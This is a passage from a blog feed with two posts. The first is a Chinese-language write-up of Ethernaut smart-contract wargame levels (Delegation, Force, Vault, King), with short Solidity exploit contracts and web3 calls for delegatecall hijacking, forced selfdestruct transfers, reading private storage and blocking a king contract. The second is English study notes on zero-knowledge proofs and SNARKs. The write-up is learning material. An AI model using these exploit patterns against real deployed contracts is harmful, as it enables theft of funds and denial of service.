MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察的是delegationcall</p><ul><li><p>call: 调用后内置变量 msg的值会修改为<strong>调用者</strong>，执行环境为被<strong>调用者的运行环境</strong></p></li><li><p>delegatecall: 调用后内置变量 msg的值<strong>不会修改为调用者</strong>，但执行环境为<strong>调用者的运行环境</strong>（相当于复制被调用者的代码到调用者合约）</p></li><li><p>callcode: 调用后内置变量 msg的值会修改为调用者，但执行环境为调用者的运行环境</p><p>由于执行环境是调用者（Delegation）的环境，所以pwn()调用后，修改的是Delegation的owner=msg.sender，又因为不会改msg.sender，所以Delegation的owner变成了我们的账户地址。</p></li></ul><p>参数可以本地算：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    function func() public view returns (bytes4)&#123;</span><br><span class="line">        return bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#0xdd365b8b</span><br></pre></td></tr></table></figure><p>也可以在js里算<code>web3.utils.keccak256("pwn()").slice(0, 10)</code>：</p><p><img src="../images/ethernaut/image-20230406114824062.png" alt="image-20230406114824062"></p><p>为什么是slice前十个：</p><ol type="1"><li>为什么要写web3.utils.keccak256()？这里面有两个问题，第一，写keccak()必须要加上前面的web3.utils，才能引入keccak()方法。第二，keccak()是一种被选定为SHA-3标准的单向散列函数算法，大概是一个海绵体结构，有吸入和挤出阶段。</li><li>为什么用slice(0,10)？以下补充一些solidity的函数选择器知识。</li></ol><p><strong>函数选择器知识补充：</strong></p><p>一个函数<strong>调用数据的前 4 字节</strong>，指定了要调用的函数。这就是某个函数签名的 Keccak 哈希的前 4 字节（高位在左的大端序）。</p><p>（但是传入的数据仍然需要前10个才能被正确解析）</p><p><img src="/images/ethernaut/image-20230406115805637.png" alt="image-20230406115805637"></p><p><img src="/images/ethernaut/image-20230406115819488.png" alt="image-20230406115819488"></p><p>后记： <a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">TheParity Wallet Hack Explained</a>介绍了一个攻击案例</p><h1 id="force">Force</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure><p>目标是强行向合约转账，考点为selfdestruct：</p><p>selfdestruct函数是一个自毁函数，当调用它时，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    constructor()  payable&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack(address payable _addr) public&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后记：</p><p><img src="/images/ethernaut/image-20230406171745559.png" alt="image-20230406171745559"></p><h1 id="vault">Vault</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标是把locked设为false，那么需要得到password</p><p>尽管password设为private，但这只是限制外部合约访问这个变量，数据保存在区块链上是透明的，可以直接用getStorageAt函数获取:</p><p><code>web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);</code></p><p><img src="/images/ethernaut/image-20230406174556548.png" alt="image-20230406174556548"></p><p>把数据放进remix里就能直接解析出来<img src="/images/ethernaut/image-20230406174623483.png" alt="image-20230406174623483"></p><p>后记：</p><p><img src="/images/ethernaut/image-20230406175010825.png" alt="image-20230406175010825"></p><h1 id="king"><strong>King</strong></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标是发送大于1000000000000000的wei成为king，而且不能让目标合约替代自己成为king</p><p>考察的是transfer函数：</p><p><img src="/images/ethernaut/image-20230406182805634.png" alt="image-20230406182805634"></p><p>如果transfer执行失败会进行回退，而call和send函数则不是，而是返回一个false</p><p>用 remix 部署合约，只需要构造一个没有 payable的回退函数或者压根没有fallback函数，就接收不到金额了</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    function attack(address _addr) public payable&#123;</span><br><span class="line">        _addr.call.gas(10000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/ethernaut/image-20230406183005656.png" alt="image-20230406183005656"></p><p>后记：</p><p>Most of Ethernaut's levels try to expose (in an oversimplified formof course) something that actually happened — a real hack or a realbug.</p><p>In this case, see: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">Kingof the Ether</a> and <a href="http://www.kingoftheether.com/postmortem.html">King of the EtherPostmortem</a>.</p><h1 id="re-entrancy"><strong>Re-entrancy</strong></h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;打靶场的记录&lt;/p&gt;</summary>
    
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/categories/blockchain/"/>
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>Zero Knowledge Proofs</title>
    <link href="http://sh1k4ku.github.io/2023/01/30/Zero-Knowledge-Proofs/"/>
    <id>http://sh1k4ku.github.io/2023/01/30/Zero-Knowledge-Proofs/</id>
    <published>2023-01-30T14:15:01.000Z</published>
    <updated>2023-08-07T12:56:19.818Z</updated>
    
    <content type="html"><![CDATA[<p>This is the record of my study of ZKP</p><span id="more"></span><p>latex是真难敲这些密码学定义，干脆截图</p><h1 id="introduction-and-history-of-zkp">Introduction and History ofZKP</h1><h2 id="what-is-proofs">what is Proofs</h2><p>Mainly to introduce some definitions：</p><p><strong>Proofs</strong>: For a <strong>Claim</strong>, the<strong>Prover</strong> provides a <strong>proof</strong><strong>w</strong> to prove the correctness of the<strong>Claim</strong> <strong>x</strong>, and the<strong>Verifier</strong> decides to accept/reject based on the<strong>proof</strong></p><p><span class="math display">\[ \begin{align*}\label{2}  &amp; \rm \textbf{Def: A language }\textit{L} \text{ is a set ofbinary strings x}\\\end{align*}\]</span></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230522224623815-1687768159269-1687768206432.png" alt="image-20230522224623815"><br></p><p>For example: Large number factoring(N = p*q), quadratic residue(y,N), the two graphs are isomorphic.</p><p><strong>Zero Knowledge Proofs</strong> means <strong>Prover</strong>prove that I could prove it If I felt like it.</p><h2 id="zero-knowledge-interactive-proofs">Zero Knowledge InteractiveProofs</h2><p>there are Two New Ingredients: <strong>Interactive</strong> and<strong>Probabilistic Proofs</strong>:</p><ul><li><strong>Interaction</strong>: rather than passively “reading” proof,<strong>verifier</strong> engages in a non-trivial<strong>interaction</strong> with the <strong>prover</strong>.</li><li><strong>Randomness</strong>: verifier is randomized (tosses coins asa primitive operation), and can err in accept/reject with smallprobability</li><li>PS: the prover can compute in unbounded time, but the verifier canjust compute in Polynominal-time(<strong>PPT</strong>)</li></ul><p>e.g., the prover proves to the color-blind verifier that a flag hastwo colors, the verifier flips a coin to decide whether to flip theflag, and the prover guesses the result of the coin based on the flags'obverse and reverse. And if we repeat the progress k times, the $prob_{coins}((1/2)^k$</p><h3 id="define-interactive-proofs">Define Interactive Proofs</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230523142952475-1687768226894.png" alt="image-20230523142952475"> <span class="math display">\[\begin{align*}\label{eq1}  &amp; \text{completeness means if x} \in L,\;V\text{ always accepts}\\&amp; \text{soundness means if x} \notin L,\; \text{for all }\textcolor[rgb]{0,0,1}{cheating \;prover\;strategy},V \text{ will notaccept except with negligible probability. }\end{align*}\]</span> so class of languages <strong>IP = {L for which there is aninteractive proof}</strong></p><h3 id="what-is-zero-knowledge">What is zero-knowledge</h3><p>For true Statements, What the verifier can compute<strong>after</strong> the interaction = What the verifier could havecomputed before interaction</p><p>Now we introduce the concept of simulation paradigm</p><h3 id="the-simulation-paradigm">The Simulation Paradigm</h3><p>V’s view gives him nothing new, if he could have simulated it its owns.t <code>simulated view</code> and <code>real-view</code> are<strong>computationally-Indistinguishable</strong></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523150750929.png" alt="image-20230523150750929"></p><p>Working through a Simulation for QR Protocol: <span class="math display">\[\begin{align}&amp; view_V(P,V):\\&amp; Transcript = (s, b, z)\\&amp; Coins = b\end{align}\]</span> so the output of simulation should be (s, b, z)</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523152110707.png" alt="image-20230523152110707"></p><h3 id="computational-indistinguishability">ComputationalIndistinguishability</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230523150823383.png" alt="image-20230523150823383"></p><p>For all distinguisher algorithms D, even after receiving a polynomialnumber of samples from <span class="math inline">\(D_b, \text{Prob[Dguesses b] &lt;1/2 + negl(k)}\)</span></p><h3 id="zero-knowledge-definition">Zero Knowledge: Definition</h3><p>An Interactive Protocol (P,V) is zero-knowledge for a language <span class="math inline">\(L\)</span> if there exists a <span class="math inline">\(\textcolor[rgb]{0,0,1}{PPT}\)</span> algorithm Sim(a simulator) such that $ L,$ the following two probabilitydistributions are <span class="math inline">\(\textcolor[rgb]{0,0,1}{poly-time}\)</span>indistinguishable:</p><ol type="1"><li><span class="math inline">\(View_V(P,V)[x] ={(q_1,a_1,q_2,a_2,…,coins\;of\; V)}\)</span></li><li><span class="math inline">\(Sim(x, 1^{\lambda}),\lambda\text{-security parameter allows sufficient Runtime onn small x}\)</span></li></ol><p>and we can get the <strong>define</strong>: (P,V) is a zero-knowledgeinteractive protocol if it is complete, sound and zero-knowledge.</p><p>but what if V is not honest? we need a further definition:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523153110540.png" alt="image-20230523153110540"></p><p>also, there are several types of ZK:</p><ul><li>Computationally indistinguishable distributions = CZK</li><li>Perfectly identical distributions = PZK</li><li>Statistically close distributions = SZK</li></ul><h2 id="zk-proof-of-knowledge">ZK proof of Knowledge</h2><p>it seems prover can not only prove the claim x(e.g. y is thequadratic residual under mode N), but also she knows more(the squareroot of y mod N), so we need extractor to get the knowledge.</p><p>the concept of ZKPOK is as follows:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523193610535.png" alt="image-20230523193610535"></p><h2 id="miscellaneous">Miscellaneous</h2><h3 id="do-all-np-languages-have-zero-knowledge-interactive-proofs">doall NP Languages have Zero Knowledge Interactive Proofs?</h3><p>the answer is <strong>yes</strong>!</p><p><strong>Theorem[GMW86,Naor]</strong>: If one-way functions exist,then every L in NP has computational zero knowledge interactiveproofs</p><p>the ideas of the proof:</p><ol type="1"><li><strong>[GMW87]</strong> Showed ZK interactive proof for G3-COLORusing bit- commitments<ul><li>for any L in NP, <span class="math inline">\(L &lt;_p\text{G3-COLOR}\)</span>(due to NPC reducibility)</li><li>every instance x can be reduced to graph <span class="math inline">\(G_x\)</span> such that:<ul><li>if x in L the <span class="math inline">\(G_x\)</span> is 3colorable; if not, <span class="math inline">\(G_x\)</span> is not 3colorable</li></ul></li></ul></li><li><strong>[Naor]</strong> showed if One Way Function exits, then bitcommitment protocol exits.</li></ol><h3 id="bit-commitment-protocol">Bit Commitment Protocol</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230523195408388.png" alt="image-20230523195408388"></p><p>i think it's a kind of variant of signature?</p><p>CZK examples</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523195948302.png" alt="image-20230523195948302"></p><h3 id="quiz">quiz</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201302340.png" alt="image-20230523201302340"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201308019.png" alt="image-20230523201308019"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201313789.png" alt="image-20230523201313789"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201318111.png" alt="image-20230523201318111"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201324211.png" alt="image-20230523201324211"></p><h1 id="overview-of-modern-snark-constructions">Overview of Modern SNARKConstructions</h1><p>this class is focusing on <strong>None-Interactive Proof</strong></p><h2 id="what-is-a-snark">What is a SNARK?</h2><h3 id="review-arithmetic-circuits">review arithmetic circuits</h3><p>arithmetic circuits: <span class="math inline">\(C: \text{F}^n\rightarrow \text{F and |C| = # gates in }C\)</span></p><h4 id="categories">categories</h4><ul><li>An <u>unstructured circuit</u>: a circuit with arbitrary wires</li><li>A <u>structured circuit</u>: <img src="/images/Zero-Knowledge-Proofs/image-20230524222300092.png" alt="image-20230524222300092"></li></ul><p><strong>M is often called a virtual machine (VM) -- one step of aprocessor</strong></p><h3 id="preprocessing-nark-non-interactive-argument-of-knowledge">(preprocessing)NARK: Non-interactive ARgument of Knowledge</h3><p>Definition: $$ <span class="math display">\[\begin{align*}\label{lab3}&amp; Premilinary:\\&amp;  \text{public arithmetic circuit: }C(x,w) \rightarrow\text{F},\text{where } x\text{ is the statement in }F^n, \text{and}w\text{ is the secret witness in }F^m\\&amp;  \text{Preprocessing(setup): S(}C\text{)}\rightarrow \text{publicparameters }(pp, vp)\\&amp; \text{so a preprocessing NARK is a triple }(S,P,V):\\&amp; \bullet\text{S(C)} \rightarrow \text{public parameters (pp, vp)for prover and verifier}\\&amp; \bullet\text{P(pp, x, w)} \rightarrow \text{proof }\pi\\&amp; \bullet\text{V(vp, x, }\pi \text{)} \rightarrow \text{accept orreject}\end{align*}\]</span> $$ <img src="/images/Zero-Knowledge-Proofs/image-20230524223927289.png" alt="image-20230524223927289"></p><h4 id="requirements-informal">requirements (informal)</h4><p><img src="/images/Zero-Knowledge-Proofs/image-20230524223949298.png" alt="image-20230524223949298"></p><h4 id="types-of-preprocessing-setup">Types of preprocessing Setup</h4><p>Setup for circuit C: <span class="math inline">\(S(C, r) \rightarrow\text{public parameters }(pp, vp)\)</span> where r is a random bit</p><ul><li>trusted setup per circuit: S(C, r) random r must be kept secret fromprover</li><li>trusted but universal (updatable) setup: secret r is independt of C<ul><li>$ S = (S_{init}, S_{index})$</li><li><span class="math inline">\(S_{init}(\lambda;r)\rightarrow \text{gp,which is one-time setup by secret r}\)</span></li><li><span class="math inline">\(S_{index}(gp,C)\rightarrow(pp, vp),\text{which is used many times}\)</span></li></ul></li><li>transparent setup: S(C) does not use secret data(or trustedsetup)</li></ul><p>for example:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230524225626646.png" alt="image-20230524225626646"></p><h4 id="knowledge-soundness">knowledge soundness</h4><p><span class="math inline">\(\text{how can we know P &quot;know&quot;w?} \rightarrow \text{P knows w, if w can be extracted fromP}\)</span></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230524230400145.png" alt="image-20230524230400145"></p><p>I think the A here is to consider all P (honest d + malicious)</p><h3 id="snark-a-succinct-argument-of-knowledge">SNARK: a SuccinctARgument of Knowledge</h3><p>a succinct proprocessing NARK is a triple(S, P, V) balabala(seeabove)</p><ul><li>need a <strong>short</strong> proof (len(<span class="math inline">\(\pi\)</span>)=sublinear(|w|))</li><li>fast to verify (time(V)=<span class="math inline">\(O_\lambda(|x|,sublinear(|C|))\)</span>) (allowing verifier sufficient time to know xbut cant learn all of C, so vp is a short summary of circuit)</li></ul><p>so SNARK is a <strong>NARK</strong>(with complete and knowledgesound) that is succinct.</p><p>zk-SNARK is a SNARK that is also zero knowledge</p><h2 id="building-an-efficient-snark">Building an efficient SNARK</h2><p>we just need two steps to get a <strong>SNARK for generalcircuits</strong>, combining:</p><ul><li><strong>A functional commitment scheme</strong> (Cryptographicobject)</li><li><strong>A compatible interactive oracle proof</strong>(IOP, which isinformation theoretic object)</li></ul><h4 id="commitments">Commitments</h4><p><strong>two algorithms</strong>:</p><ul><li><span class="math inline">\(commit(m,r)\rightarrow com\;\;\;\;\;\text{(r chosen at random)}\)</span></li><li><span class="math inline">\(verify(m,com,r)\rightarrow \text{acceptor reject}\)</span></li></ul><p>Properties: (informal)</p><ul><li>binding: <span class="math inline">\(\rightarrow \text{a maliciouscommitter cant produce a commitment and there is no two valid openingsfor com}\)</span></li><li>hiding: <span class="math inline">\(\rightarrow \text{com revealsnothing about committed data}\)</span></li></ul><p><u>for example:</u></p><p>use Hash function as commitment</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525130450691.png" alt="image-20230525130450691"></p><h5 id="committing-to-a-function">Committing to a function</h5><p>next picture shows <strong>how</strong> to committe to afunction:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525130646106.png" alt="image-20230525130646106"></p><p>the <strong>definition</strong> of committing to a function:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525130843430.png" alt="image-20230525130843430"></p><h5 id="four-important-functional-commitments">Four important functionalcommitments</h5><p><img src="/images/Zero-Knowledge-Proofs/image-20230525130947030.png" alt="image-20230525130947030"></p><h5 id="equality-test-protocol">equality test protocol</h5><p>there is a useful observation: <span class="math display">\[\begin{align}&amp; \text{for a }f\in F_{p}^{(\leq d)}[X],\text{ and } r\stackrel{$}{\leftarrow}F_p: Pr[f(r) = 0] \leq d/p \;(*)\\&amp; \text{suppose p}  \approx2^{256} \text{and d} \leq2^{40},\text{the d/p is negligible}\\&amp; \text{so for }r \stackrel{$}{\leftarrow}F_p: \text{ if f(r)=0 thenf is identically zero w.h.p}\\&amp; \text{this is a simple zere test for a committed polynomial}\end{align}\]</span> further， <strong>SZDL lemma</strong>: (*) also holds formultivariate polynomials (where d is total degree of f)</p><p>now we can get this:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525132124326.png" alt="image-20230525132124326"></p><p>which is a simple <strong>equality test</strong> for two committedpolynomials.</p><p>so the equalitty test protocol is:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525132221418.png" alt="image-20230525132221418"></p><p>but this is interactive, we want <strong>none-interactive</strong> tomake it a SNARK, the <strong>Fiat-Shamir transform</strong> can doit.</p><p><strong>The Fiat-Shamir transform</strong>: <span class="math inline">\(H:M\rightarrow R \text{ a cryptographic hashfunction}\)</span>, the idea: prover generates verifier's random bits onits own using H</p><p>H is also modeled as a Random Oracle (RO)</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525132556241.png" alt="image-20230525132556241"></p><p>now we can get a SNARK for polynomial equality testing (just let ther generated by H)</p><h4 id="f-iop-poly-iop"><span class="math inline">\(F-IOP\)</span> (PolyIOP)</h4><p><strong>Goal</strong>: make a functional commitment to a SNARK forgeneral circuits</p><p><em>example</em> :</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525164356620.png" alt="image-20230525164356620"></p><p>Here's how F-IOP works:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525165835815.png" alt="image-20230525165835815"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525165846209.png" alt="image-20230525165846209"></p><p>properties:</p><ul><li><strong>Complete</strong>: <span class="math inline">\(if \; \existsw:C(x,w)=0 \text{ then Pr[verifier accepts]=1}\)</span></li><li>(Unconditional) knowledge sound (as an IOP): [<span class="math inline">\(\text{extractor is given }(x, f_1,r_1,...,r_{t-1},f_t) \text{ and outputs w}\)</span>]</li><li>Optional: <strong>Zero knowledge</strong> (for a zk-SNARK)</li></ul><p><em>example</em>:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525171633287.png" alt="image-20230525171633287"></p><p>although this process is interactive, we can use Fiat-Sharmirtransformer to turn it to an none-interactive process(SNARK)</p><h2 id="miscellaneous-1">Miscellaneous</h2><h3 id="question">question</h3><ol type="1"><li>In the Poly-IOP example listed above, sending the commitment of fand q to the verifier is what is done. According to the definition ofcommitment, there needs to be f and random r to open and verify, butapparently the verifier does not have this data (This problem alsoexists in other examples) (this problem may be because I do not knowabout commitment)</li></ol><h3 id="quiz-1">quiz</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230525190022314.png" alt="image-20230525190022314"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525190028070.png" alt="image-20230525190028070"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525190035739.png" alt="image-20230525190035739"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525190040511.png" alt="image-20230525190040511"></p><h1 id="libraries-and-compilers-to-build-zkp">Libraries and Compilers tobuild ZKP</h1><p>introducting how to instance a zkp</p><h2 id="zkp-programmability">ZKP Programmability</h2><p>something about <span class="math inline">\(\phi\)</span>:</p><ol type="1"><li>in theory, witness w can be a factorization of integer x, is the skfor pk x</li><li>in practice, <span class="math inline">\(\phi\)</span> is an"<strong>arithmetic circuit</strong>", over inputs x and w.</li></ol><p>AC as circuit has inputs, gates and wires</p><h3 id="r1cs-format-for-zkp-acs">R1CS: format for ZKP ACs</h3><ul><li>x: field elements <span class="math inline">\(x_1,...x_l\)</span></li><li>w: <span class="math inline">\(w_1, ...w_{m-l-1}\)</span></li><li><span class="math inline">\(\phi\)</span>: n equations of form:<ul><li><span class="math inline">\(\alpha \times\beta=\gamma\)</span></li></ul></li></ul><p><img src="/images/Zero-Knowledge-Proofs/image-20230602152443353.png" alt="image-20230602152443353"></p><p>The definition of the extension is matrix-based, but we can treateach of these row vectors as a linear R1CS:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602152726766.png" alt="image-20230602152726766"></p><p>The next step is to build R1CS from three parts: HDL, Library,Compiler, using examples that are all Sudoku</p><h2 id="hdluse-circom">HDL(use Circom)</h2><p>PL VS HDL:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602160136344.png" alt="image-20230602160136344"></p><p>Circom does:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602161417667.png" alt="image-20230602161417667"></p><p>https://docs.circom.io/</p><p>there are several basic method in the code, like judging two nums notequal, num in range of 4bits, and advanced applications.</p><p>code:https://github.com/rdi-berkeley/zkp-course-lecture3-code/blob/main/circom/sudoku.circom</p><h2 id="libraryuse-arkwork">library(use arkwork)</h2><p><img src="/images/Zero-Knowledge-Proofs/image-20230602162155729.png" alt="image-20230602162155729"></p><p>so we can just use this library in some certain pl, just using theirsyntax.</p><p>https://github.com/arkworks-rs/r1cs-tutorial/</p><p>code:https://github.com/rdi-berkeley/zkp-course-lecture3-code/tree/main/arkworks</p><h2 id="compileruse-zokrates">compiler(use ZoKrates)</h2><p>the idea of this way is using variables, functions, and arrays in thecircuit.</p><p>but there is <strong>no way</strong> to compute witness(?), allwitness must be provided as input.</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602162911169.png" alt="image-20230602162911169"></p><p>code:https://github.com/rdi-berkeley/zkp-course-lecture3-code/blob/main/zokrates/root.zok</p><h2 id="an-overview-of-prominent-zkp-toolchains">An overview ofprominent ZKP toolchains</h2><p>comparison:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163154657.png" alt="image-20230602163154657"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163200099.png" alt="image-20230602163200099"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163204782.png" alt="image-20230602163204782"></p><p>other tools:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163225247.png" alt="image-20230602163225247"></p><h2 id="misc">Misc</h2><p>quiz:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163954149.png" alt="image-20230602163954149"></p><h1 id="interactive-proofs">Interactive Proofs</h1><p>Introducing ip and checksum protocols</p><h1 id="plonk-interactive-oracle-proofs-iop">Plonk Interactive OracleProofs (IOP)</h1><p>introducing widely used SNARK called Plonk, understanding all thecomponent that make up the SNARK.</p><h1 id="discrete-log-based-polynomial-commitments">Discrete-log-basedPolynomial Commitments</h1><h1 id="zkp-based-on-error-correcting-codes">ZKP based onError-Correcting Codes</h1><h2 id="error-correcting-codes">error-correcting codes</h2><h2 id="polynomial-commitment-based-on-error-correcting-codes">polynomialcommitment based on error-correcting codes</h2><h2 id="linear-time-encodable-code-based-on-expanders">linear-timeencodable code based on expanders</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;This is the record of my study of ZKP&lt;/p&gt;</summary>
    
    
    
    <category term="ZKP" scheme="http://sh1k4ku.github.io/categories/ZKP/"/>
    
    
    <category term="ZKP" scheme="http://sh1k4ku.github.io/tags/ZKP/"/>
    
  </entry>
  
  <entry>
    <title>祥云杯</title>
    <link href="http://sh1k4ku.github.io/2022/10/30/2022/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>http://sh1k4ku.github.io/2022/10/30/2022/%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
